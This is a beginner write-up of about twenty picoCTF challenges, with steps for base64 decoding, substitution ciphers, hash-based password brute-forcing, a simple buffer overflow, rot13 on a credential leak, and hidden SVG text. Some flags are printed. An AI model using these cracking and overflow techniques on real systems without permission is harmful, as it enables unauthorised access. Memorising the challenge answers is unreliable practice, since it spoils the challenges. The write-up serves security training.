# PicoCTF Write-UP (6~10 page)
## login
![](https://i.imgur.com/nPzcWB4.png)

### Hints
None

### Solution by steps
1. Press the link and you'll get this
![](https://i.imgur.com/gZGY5Ys.png)
2. Press 'Ctrl + U' and get this
```htmlmixed=

<!doctype html>
<html>
    <head>
        <link rel="stylesheet" href="styles.css">
        <script src="index.js"></script>
    </head>
    <body>
        <div>
          <h1>Login</h1>
          <form method="POST">
            <label for="username">Username</label>
            <input name="username" type="text"/>
            <label for="username">Password</label>
            <input name="password" type="password"/>
            <input type="submit" value="Submit"/>
          </form>
        </div>
    </body>
</html>
```
3. Press the "index.js" and you'll see this
```javascript=
(async()=>{await new Promise((e=>window.addEventListener("load",e))),document.querySelector("form").addEventListener("submit",(e=>{e.preventDefault();const r={u:"input[name=username]",p:"input[name=password]"},t={};for(const e in r)t[e]=btoa(document.querySelector(r[e]).value).replace(/=/g,"");return"YWRtaW4"!==t.u?alert("Incorrect Username"):"cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ"!==t.p?alert("Incorrect Password"):void alert(`Correct Password! Your flag is ${atob(t.p)}.`)}))})();
```
4. Type in `YWRtaW4` as user name and `cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ` as the password but ...
![](https://i.imgur.com/LXPDg51.png)
5. Use [BASE64 DECODER](https://www.base64decode.org/) to decode those two strings you just got and you'll find the flag

### Useful Stuffs
1. https://www.base64decode.org/

## advanced-potion-making
![](https://i.imgur.com/sof84yV.png)

### Hints
None

### Solution by steps
1. Press the link to down the file
2. Upload it to [Online Hex Editor](https://hexed.it/) and fix the file to be the same as the yellow part in this picture ([REASON](https://asecuritysite.com/forensics/png?file=%2Flog%2Fbasn0g01.png))
![](https://i.imgur.com/lNh42wS.png)
3. Download the fixed file (Don't forget to change the file name to .png) and upload it to [Online Image Editor](https://www.online-image-editor.com/) 
4. Press "Color Change" >>> "B&W" and you'll get the flag
![](https://i.imgur.com/ENwA0MH.png)

### Useful Stuffs
1. https://medium.com/@matus.vaclav1/picoctf-advanced-potion-making-eff6b4ebbdcf


## spelling-quiz
![](https://i.imgur.com/gXSKNVZ.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/picoMini+by+redpwn/Cryptography/spelling-quiz/public.zip`
2. `unzip public.zip` and `cd public`
3. You'll see three files lying here
- flag.txt
`brcfxba_vfr_mid_hosbrm_iprc_exa_hoav_vwcrm`
- encrypt.py
```python=
import random
import os
files = [
    os.path.join(path, file)
    for path, dirs, files in os.walk('.')
    for file in files
    if file.split('.')[-1] == 'txt'
alphabet = list('abcdefghijklmnopqrstuvwxyz')
random.shuffle(shuffled := alphabet[:])
dictionary = dict(zip(alphabet, shuffled))
for filename in files:
    text = open(filename, 'r').read()
    encrypted = ''.join([
        dictionary[c]
        if c in dictionary else c
        for c in text
    ])
    open(filename, 'w').write(encrypted)
```

- study-guide.txt
```cpp
...
aobrcdxwrvq
cxsyrrklrm
oturlwrya
vfcisuixcvrcwvwa
ibfvfxlsimwxdtiawa
bcixnjowvvxl
tituxcuxcwxt
vcxtaosbvwit
srmwixtvrcwic
liiartwtd
niotvrcavcrxs
wsbrxnfrm
avcwtdwlq
wtvrcerxprsrtv
sotwnwbxlwvwr
...
```
4. Look these lines in encrypt.py which means it is a kind of [character frequencies question](https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87)
```python=
alphabet = list('abcdefghijklmnopqrstuvwxyz')
random.shuffle(shuffled := alphabet[:])
dictionary = dict(zip(alphabet, shuffled))
```
5. Paste the text in flag.txt in [quipqiup](https://quipqiup.com/) and flag is the one seems not so weird

### Useful Stuffs
1. https://ankmak.com/tech/2021/10/07/picoctf-write-up-cryptography.html#spelling-quiz-100-points
2. https://quipqiup.com/
3. https://zh.wikipedia.org/wiki/%E5%AD%97%E6%AF%8D%E9%A2%91%E7%8E%87

## Codebook
![](https://i.imgur.com/1Xj9OAg.png)

### Hints
1. On the webshell, use ls to see if both files are in the directory you are in
2. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. ` wget https://artifacts.picoctf.net/c/102/code.py`
2. `wget https://artifacts.picoctf.net/c/102/codebook.txt`
3. `python code.py` and you'll get the flag

### Useful Stuffs
1. https://blog.gtwang.org/linux/linux-ls-command-tutorial/
2. https://realpython.com/run-python-scripts/
3. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/

## convertme.py
![](https://i.imgur.com/Fe2Nl9V.png)

### Hints
1. Look up a decimal to binary number conversion app on the web or use your computer's calculator!
2. The str_xor function does not need to be reverse engineered for this challenge.
3. If you have Python on your computer, you can download the script normally and run it. Otherwise, use the wget command in the webshell.
4. To use wget in the webshell, first right click on the download link and select 'Copy Link' or 'Copy Link Address'
5. Type everything after the dollar sign in the webshell: $ wget , then paste the link after the space after wget and press enter. This will download the script for you in the webshell so you can run it!
6. Finally, to run the script, type everything after the dollar sign and then press enter: `$ python3 convertme.py`

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/31/convertme.py`
2. `python convertme.py` and it outputs 
```python
If 63 is in decimal base, what is it in binary base?
Answer:
```
3. Find a [Online Decimal-to-Binary Calculator](https://www.rapidtables.com/convert/number/decimal-to-binary.html) and type in the number you get above
4. Answer the question with the answer you just got above and it will retun you the flag

### Useful Stuffs
1. https://www.rapidtables.com/convert/number/decimal-to-binary.html

## fixme1.py
![](https://i.imgur.com/pL2jwHZ.png)

### Hints
1. Indentation is very meaningful in Python
2. To view the file in the webshell, do: $ nano fixme1.py
3. To exit nano, press Ctrl and x and follow the on-screen prompts.
4. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/39/fixme1.py`
2. `vim fixme1.py` and press `i` to delete the two extra blank in the last line before `print(...)`
3. Press esc and `:wq` to exit
4. `python fixme1.py` to get your flag

### Useful Stuffs
1. https://code.yidas.com/linux-vi-vim-command/
2. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
3. https://realpython.com/run-python-scripts/
4. https://www.runoob.com/python/python-basic-syntax.html

## fixme2.py
![](https://i.imgur.com/dG9S2XP.png)

### Hints
1. Are equality and assignment the same symbol?
2. To view the file in the webshell, do: $ nano fixme2.py
3. To exit nano, press Ctrl and x and follow the on-screen prompts.
4. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/65/fixme2.py`
2. `vim fixme2.py` and change the `if flag = ""` to `if flag == ""`, press esc and `:wq` to exit
3. `python fixme2.py` and yourflag willpops out

### Useful Stuffs
1. https://code.yidas.com/linux-vi-vim-command/
2. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
3. https://realpython.com/run-python-scripts/
4. https://www.runoob.com/python/python-if-statement.html

## Glitch Cat
![](https://i.imgur.com/lD1PAdi.png)

### Hints
1. ASCII is one of the most common encodings used in programming
2. We know that the glitch output is valid Python, somehow!
3. Press Ctrl and c on your keyboard to close your connection and return to the command prompt.

### Solution by steps
1. `nc saturn.picoctf.net 51109` and it returns strings like `'picoCTF{gl17ch_m3_n07_' + chr(0x62) + chr(0x64) + chr(0x61) + chr(0x36) + chr(0x38) + chr(0x66) + chr(0x37) + chr(0x35) + '}'`
2. Press Ctrl+C to exit
3. Type `python` and input `print(THINGS_YOU_JUST_GOT_ABOVE)`
4. After hitting enter you'll get your flag

### Useful Stuffs
1. https://code.yidas.com/linux-vi-vim-command/
2. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
3. https://realpython.com/run-python-scripts/
4. https://www.runoob.com/python/python-basic-syntax.html

## HashingJobApp
![](https://i.imgur.com/nKWr1nl.png)

### Hints
1. You can use a commandline tool or web app to hash text
2. Press Ctrl and c on your keyboard to close your connection and return to the command prompt.

### Solution by steps
1. `nc saturn.picoctf.net 57689` and it will give you a text you must response with it's MD5 Hash one
2. Use [MD5 Hash Generator](https://www.md5hashgenerator.com/) to help you
3. Be fast or it will failed

### Useful Stuffs
1. https://www.md5hashgenerator.com/

## PW Crack 1
![](https://i.imgur.com/Gqwxg2q.png)


### Hints
1. To view the file in the webshell, do: `$ nano level1.py`
2. To exit nano, press Ctrl and x and follow the on-screen prompts.
3. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/52/level1.py`
2. `wget https://artifacts.picoctf.net/c/52/level1.flag.txt.enc`
3. `vim level1.py` and you'll see this
```python=
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################


flag_enc = open('level1.flag.txt.enc', 'rb').read()



def level_1_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == "1e1a"):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")



level_1_pw_check()
```
4. `python level1.py` and enter `1e1a` as the password
5. And here comes the flag

### Useful Stuff
1. https://code.yidas.com/linux-vi-vim-command/
2. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
3. https://realpython.com/run-python-scripts/
4. https://www.runoob.com/python/python-basic-syntax.html

## PW Crack 2
![](https://i.imgur.com/0DyBGCR.png)


### Hints
1. Does that encoding look familiar?
2. The str_xor function does not need to be reverse engineered for this challenge.


### Solution by steps
1. `wget https://artifacts.picoctf.net/c/18/level2.py`
2. ` wget https://artifacts.picoctf.net/c/18/level2.flag.txt.enc`
3. `vim level2.py` and you'll see this
```python=
### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open('level2.flag.txt.enc', 'rb').read()



def level_2_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    if( user_pw == chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65) ):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")



level_2_pw_check()
```
4. Press `:wq` to exit
5. Type `python` and run `print(chr(0x33) + chr(0x39) + chr(0x63) + chr(0x65))` (Don't forget to type `exit()` to exit thhis mode)
6. Copy the result and paste after running `python level2.py` and the flag pops out

### Useful Stuffs
1. https://code.yidas.com/linux-vi-vim-command/
2. https://blog.gtwang.org/linux/linux-wget-command-download-web-pages-and-files-tutorial-examples/
3. https://realpython.com/run-python-scripts/
4. https://www.runoob.com/python/python-basic-syntax.html


## PW Crack 3
![](https://i.imgur.com/jbKRMTk.png)


### Hints
1. To view the level3.hash.bin file in the webshell, do: `$ bvi level3.hash.bin`
2. To exit bvi type `:q` and press enter.
3. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/23/level3.py`
2. `wget https://artifacts.picoctf.net/c/23/level3.flag.txt.enc`
3. `wget https://artifacts.picoctf.net/c/23/level3.hash.bin`
4. `vim level3.py` and you'll see this
```python=
import hashlib

### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open('level3.flag.txt.enc', 'rb').read()
correct_pw_hash = open('level3.hash.bin', 'rb').read()



def hash_pw(pw_str):
    pw_bytes = bytearray()
    pw_bytes.extend(pw_str.encode())
    m = hashlib.md5()
    m.update(pw_bytes)
    return m.digest()


def level_3_pw_check():
    user_pw = input("Please enter correct password for flag: ")
    user_pw_hash = hash_pw(user_pw)

    if( user_pw_hash == correct_pw_hash ):
        print("Welcome back... your flag, user:")
        decryption = str_xor(flag_enc.decode(), user_pw)
        print(decryption)
        return
    print("That password is incorrect")


level_3_pw_check()


# The strings below are 7 possibilities for the correct password. 
#   (Only 1 is correct)
pos_pw_list = ["6997", "3ac8", "f0ac", "4b17", "ec27", "4e66", "865e"]
```
5. Run `python level3.py` and type in the strings in `pos_pw_list` continuously until you get your flag

### Useful Stuffs
None

## PW Crack 4
![](https://i.imgur.com/yXoq1Gw.png)

### Hints
1. A for loop can help you do many things very quickly.
2. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/59/level4.py`
2. `wget https://artifacts.picoctf.net/c/59/level4.flag.txt.enc`
3. `wget https://artifacts.picoctf.net/c/59/level4.hash.bin`
4. `vim level4.py` and change it to this
```python=
import hashlib

### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open('level4.flag.txt.enc', 'rb').read()
correct_pw_hash = open('level4.hash.bin', 'rb').read()


def hash_pw(pw_str):
    pw_bytes = bytearray()
    pw_bytes.extend(pw_str.encode())
    m = hashlib.md5()
    m.update(pw_bytes)
    return m.digest()



def level_4_pw_check():
#    user_pw = input("Please enter correct password for flag: ")
    pw_list = ["158f", "1655", "d21e", "4966", "ed69", "1010", "dded", "844c", "40ab", "a948", "156c", "ab7f", "4a5f", "e38c", "ba12", "f7fd", "d780", "4f4d", "5ba1", "96c5", "55b9", "8a67", "d32b", "aa7a", "514b", "e4e1", "1230", "cd19", "d6dd", "b01f", "fd2f", "7587", "86c2", "d7b8", "55a2", "b77c", "7ffe", "4420", "e0ee", "d8fb", "d748", "b0fe", "2a37", "a638", "52db", "51b7", "5526", "40ed", "5356", "6ad4", "2ddd", "177d", "84ae", "cf88", "97a3", "17ad", "7124", "eff2", "e373", "c974", "7689", "b8b2", "e899", "d042", "47d9", "cca9", "ab2a", "de77", "4654", "9ecb", "ab6e", "bb8e", "b76b", "d661", "63f8", "7095", "567e", "b837", "2b80", "ad4f", "c514", "ffa4", "fc37", "7254", "b48b", "d38b", "a02b", "ec6c", "eacc", "8b70", "b03e", "1b36", "81ff", "77e4", "dbe6", "59d9", "fd6a", "5653", "8b95", "d0e5"]
    for i in pw_list:
        user_pw_hash = hash_pw(i)

        if( user_pw_hash == correct_pw_hash ):
            print("Welcome back... your flag, user:")
            decryption = str_xor(flag_enc.decode(),i)
            print(decryption)
            return
        print("That password is incorrect")



level_4_pw_check()



# The strings below are 100 possibilities for the correct password. 
#   (Only 1 is correct)
pos_pw_list = ["158f", "1655", "d21e", "4966", "ed69", "1010", "dded", "844c", "40ab", "a948", "156c", "ab7f", "4a5f", "e38c", "ba12", "f7fd", "d780", "4f4d", "5ba1", "96c5", "55b9", "8a67", "d32b", "aa7a", "514b", "e4e1", "1230", "cd19", "d6dd", "b01f", "fd2f", "7587", "86c2", "d7b8", "55a2", "b77c", "7ffe", "4420", "e0ee", "d8fb", "d748", "b0fe", "2a37", "a638", "52db", "51b7", "5526", "40ed", "5356", "6ad4", "2ddd", "177d", "84ae", "cf88", "97a3", "17ad", "7124", "eff2", "e373", "c974", "7689", "b8b2", "e899", "d042", "47d9", "cca9", "ab2a", "de77", "4654", "9ecb", "ab6e", "bb8e", "b76b", "d661", "63f8", "7095", "567e", "b837", "2b80", "ad4f", "c514", "ffa4", "fc37", "7254", "b48b", "d38b", "a02b", "ec6c", "eacc", "8b70", "b03e", "1b36", "81ff", "77e4", "dbe6", "59d9", "fd6a", "5653", "8b95", "d0e5"]
```
5. `python level4.py` and get your flag

### Useful Stuffs
1. https://infosecwriteups.com/beginner-picomini-ctf-2022-writeup-94174d0ea64b

## PW Crack 5
![](https://i.imgur.com/ieSClKV.png)

### Hints
1. Opening a file in Python is crucial to using the provided dictionary.
2. You may need to trim the whitespace from the dictionary word before hashing. Look up the Python string function, strip
3. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/80/level5.py`
2. `wget https://artifacts.picoctf.net/c/80/level5.flag.txt.enc`
3. `wget https://artifacts.picoctf.net/c/80/level5.hash.bin`
4. `wget https://artifacts.picoctf.net/c/80/dictionary.txt`
5. `vim level5.py` and make sure to change it like this
```python=
import hashlib

### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################
def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])
###############################################################################

flag_enc = open('level5.flag.txt.enc', 'rb').read()
correct_pw_hash = open('level5.hash.bin', 'rb').read()


def hash_pw(pw_str):
    pw_bytes = bytearray()
    pw_bytes.extend(pw_str.encode())
    m = hashlib.md5()
    m.update(pw_bytes)
    return m.digest()


def level_5_pw_check():
#    user_pw = input("Please enter correct password for flag: ")
    f = open("dictionary.txt","r")
    for i in f:
        pw = i.strip("\n")
        user_pw_hash = hash_pw(pw)

        if( user_pw_hash == correct_pw_hash ):
            print("Welcome back... your flag, user:")
            decryption = str_xor(flag_enc.decode(), pw)
            print(decryption)
            return
    print("That password is incorrect")



level_5_pw_check()
```
6. Type `:wq` and hit enter to quit the window
7. Run `python level5.py` to get your flag
### Useful Stuffs
1. https://infosecwriteups.com/beginner-picomini-ctf-2022-writeup-94174d0ea64b

## runme.py
![](https://i.imgur.com/lhn7WYQ.png)

### Hints
1. If you have Python on your computer, you can download the script normally and run it. Otherwise, use the wget command in the webshell.
2. To use wget in the webshell, first right click on the download link and select 'Copy Link' or 'Copy Link Address'
3. Type everything after the dollar sign in the webshell: $ wget , then paste the link after the space after wget and press enter. This will download the script for you in the webshell so you can run it!
4. Finally, to run the script, type everything after the dollar sign and then press enter: $ python3 runme.py You should have the flag now!

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/86/runme.py`
2. `python runme.py` and the flag will pops out

### Useful Stuffs
None

## Serpentine
![](https://i.imgur.com/530JtjX.png)

### Hints
1. Try running the script and see what happens
2. In the webshell, try examining the script with a text editor like nano
3. To exit nano, press Ctrl and x and follow the on-screen prompts.
4. The str_xor function does not need to be reverse engineered for this challenge.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/93/serpentine.py`
2. `python serpentine.py` and you'll get this
```python=

    Y
  .-^-.
 /     \      .- ~ ~ -.
()     ()    /   _ _   `.                     _ _ _
 \_   _/    /  /     \   \                . ~  _ _  ~ .
   | |     /  /       \   \             .' .~       ~-. `.
   | |    /  /         )   )           /  /             `.`.
   \ \_ _/  /         /   /           /  /                `'
    \_ _ _.'         /   /           (  (
                    /   /             \  \
                   /   /               \  \
                  /   /                 )  )
                 (   (                 /  /
                  `.  `.             .'  /
                    `.   ~ - - - - ~   .'
                       ~ . _ _ _ _ . ~

Welcome to the serpentine encourager!


a) Print encouragement
b) Print flag
c) Quit
```
3. But after pressing b, it doesn't return the flag
4. `vim serpentine.py` and chamge it to this (Because it never use the print_flag())
```python=
import random
import sys



def str_xor(secret, key):
    #extend key to secret length
    new_key = key
    i = 0
    while len(new_key) < len(secret):
        new_key = new_key + key[i]
        i = (i + 1) % len(key)
    return "".join([chr(ord(secret_c) ^ ord(new_key_c)) for (secret_c,new_key_c) in zip(secret,new_key)])


flag_enc = chr(0x15) + chr(0x07) + chr(0x08) + chr(0x06) + chr(0x27) + chr(0x21) + chr(0x23) + chr(0x15) + chr(0x5c) + chr(0x01) + chr(0x57) + chr(0x2a) + chr(0x17) + chr(0x5e) + chr(0x5f) + chr(0x0d) + chr(0x3b) + chr(0x19) + chr(0x56) + chr(0x5b) + chr(0x5e) + chr(0x36) + chr(0x53) + chr(0x07) + chr(0x51) + chr(0x18) + chr(0x58) + chr(0x05) + chr(0x57) + chr(0x11) + chr(0x3a) + chr(0x0f) + chr(0x0e) + chr(0x59) + chr(0x06) + chr(0x4d) + chr(0x55) + chr(0x0c) + chr(0x0f) + chr(0x14)


def print_flag():
  flag = str_xor(flag_enc, 'enkidu')
  print(flag)


def print_encouragement():
  encouragements = ['You can do it!', 'Keep it up!',
                    'Look how far you\'ve come!']
  choice = random.choice(range(0, len(encouragements)))
  print('\n-----------------------------------------------------')
  print(encouragements[choice])
  print('-----------------------------------------------------\n\n')



def main():

  print(
'''
    Y
  .-^-.
 /     \      .- ~ ~ -.
()     ()    /   _ _   `.                     _ _ _
 \_   _/    /  /     \   \                . ~  _ _  ~ .
   | |     /  /       \   \             .' .~       ~-. `.
   | |    /  /         )   )           /  /             `.`.
   \ \_ _/  /         /   /           /  /                `'
    \_ _ _.'         /   /           (  (
                    /   /             \  \\
                   /   /               \  \\
                  /   /                 )  )
                 (   (                 /  /
                  `.  `.             .'  /
                    `.   ~ - - - - ~   .'
                       ~ . _ _ _ _ . ~
'''
  )
  print('Welcome to the serpentine encourager!\n\n')

  while True:
    print('a) Print encouragement')
    print('b) Print flag')
    print('c) Quit\n')
    choice = input('What would you like to do? (a/b/c) ')

    if choice == 'a':
      print_encouragement()

    elif choice == 'b':
     print_flag()

    elif choice == 'c':
      sys.exit(0)

    else:
      print('\nI did not understand "' + choice + '", input only "a", "b" or "c"\n\n')



if __name__ == "__main__":
  main()
```
5. Press esc and `:wq` to quit
6. Run `python serpentine.py` again and press b, you'll get your flag

### Useful Stuffs
None


## basic-file-exploit
![](https://i.imgur.com/KO6H87r.png)

### Hints
1. Try passing in things the program doesn't expect. Like a string instead of a number.

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/542/program-redacted.c`
2. `strings program-redacted.c` and find this:
```c
static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;
  memset(output, '\0', 100);
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
    printf("Goodbye!\n");
    exit(0);
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
```
*Which means we must set the entry number which equals to 0*
3. `nc saturn.picoctf.net 55825` and you'll get this as output
```python
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
2 # test if I could type entry number directly
2
No data yet # So we set data in the next step
1
1
Please enter your data:
lalala 
lalala
Please enter the length of your data:
6
6
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
0 # try 0 and it works
0
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
```
### Useful Stufffs
None

## basic-mod1
![](https://i.imgur.com/whfVcoA.png)

### Hints
1. Do you know what mod 37 means?
2. mod 37 means modulo 37. It gives the remainder of a number after being divided by 37.

### Solution by stes
1. `wget https://artifacts.picoctf.net/c/394/message.txt`
2. `cat message.txt` and you'll get this `202 137 390 235 114 369 198 110 350 396 390 383 225 258 38 291 75 324 401 142 288 397`
3. `vim solve.py` and paste this 
```python=
import string

dc = string.ascii_lowercase
dc += "0123456789_"

ef = [202,137,390,235,114,369,198,110,350,396,390,383,225,258,38,291,75,324,401,142,288,397]

flag = ""

for i in ef:
    a = i % 37
    flag += dc[a]

print(flag)
```
4. Press esc and `:wq` to quit
5. Run `python solve.py` and wrap the result with `picoCTF{}`

### Useful Stuffs
None

## base-mod2
![](https://i.imgur.com/QyMUifi.png)

### Hints
1. Do you know what the modular inverse is?
2. The inverse modulo z of x is the number, y that when multiplied by x is 1 modulo z
3. It's recommended to use a tool to find the modular inverses

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/501/message.txt`
2. `cat message.txt` and get this `104 290 356 313 262 337 354 229 146 297 118 373 221 359 338 321 288 79 214 277 131 190 377`
3. `vim solve.py` and write 

```python=
import string

dc = string.ascii_lowercase
dc += "0123456789_"
ef = [104 ,290 ,356 ,313, 262, 337 ,354 ,229 ,146, 297, 118 ,373 ,221 ,359 ,338, 321 ,288 ,79, 214, 277, 131, 190, 377]

flag = ""
for i in ef:
    a = pow(i, -1, 41)
    flag += dc[a-1]

print(flag)
```
4. Press esc and `:wq` to exit
5. Run `python solve.py` and wrap the result with `picoCTF{}`

### Useful Stuffs
None

## buffer overflow 0
![](https://i.imgur.com/i7wH4Iq.png)

### Hints
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run man gets and read the BUGS section. How many characters can the program really read?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/522/vuln`
2. `wget https://artifacts.picoctf.net/c/522/vuln.c`
3. `nano vuln.c` and you'll find this
```c=
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
*The sigsegv_handler function is kind of [segmentation fault](https://zh.wikipedia.org/wiki/%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5%E9%8C%AF%E8%AA%A4)*

4. Therefore, run `nc saturn.picoctf.net 51110` and
```c=
Input: AAAAAAAAAAAAAAAAAAAAA
picoCTF{ov3rfl0ws_ar3nt_that_bad_8ba275ff}
```

### Useful Stuffs
1. https://www.youtube.com/watch?v=iQgbNZjY8M0&ab_channel=AlmondForce
2. https://zh.wikipedia.org/wiki/%E8%A8%98%E6%86%B6%E9%AB%94%E5%8D%80%E6%AE%B5%E9%8C%AF%E8%AA%A4
3. https://enscribe.dev/ctfs/pico22/pwn/buffer-overflow-series/

## credstuff
![](https://i.imgur.com/uJ8Lpiw.png)

### Hints
1. Maybe other passwords will have hints about the leak?

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/534/leak.tar`
2. `tar xvf leak.tar` and `cd leak`
3. `grep -n cultiris usernames.txt` and get `378:cultiris`
4. `awk '{if(NR==378) print $0}' passwords.txt` to get the encrypted password
5. `awk '{if(NR==378) print $0}' passwords.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'` to get the actual password

### Useful Stuffs
1. https://github.com/DoomHackCTF/WriteUps/tree/main/picoCTF2022/Crypto/credstuff
2. http://note.drx.tw/2008/04/command.html
3. https://blog.gtwang.org/linux/linux-grep-command-tutorial-examples/

## CVE-XXXX-XXXX
![](https://i.imgur.com/GqgNoYM.png)

### Hints
1. We're not looking for the Local Spooler vulnerability in 2021...

### Solution by steps
1. Search `Windows Print Spooler Service RCE` in Google
2. Copy the first one and that's the flag...

### Useful Sttuffs
None 

## Enhance!
![](https://i.imgur.com/crIygmR.png)

### Hints
None

### Solution by steps
1. `wget https://artifacts.picoctf.net/c/138/drawing.flag.svg`
2. `strings drawing.flag.svg` and you'll see thses lines at the bottom part
```htmlembedded=
...
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3748">p </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.08942"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3754">i </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.09383"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3756">c </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.09824"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3758">o </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.10265"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3760">C </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.10706"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3762">T </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.11147"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3764">F { 3 n h 4 n </tspan><tspan
         sodipodi:role="line"
         x="107.43014"
         y="132.11588"
         style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;"
         id="tspan3752">c 3 d _ d 0 a 7 5 7 b f }</tspan></text>
...
```
3. After pressing esc and `:wq`,run `python` and type in your flag in this format `print("picoCTF { 3 n h 4 n c 3 d _ d 0 a 7 5 7 b f }".replace(" ",""))`
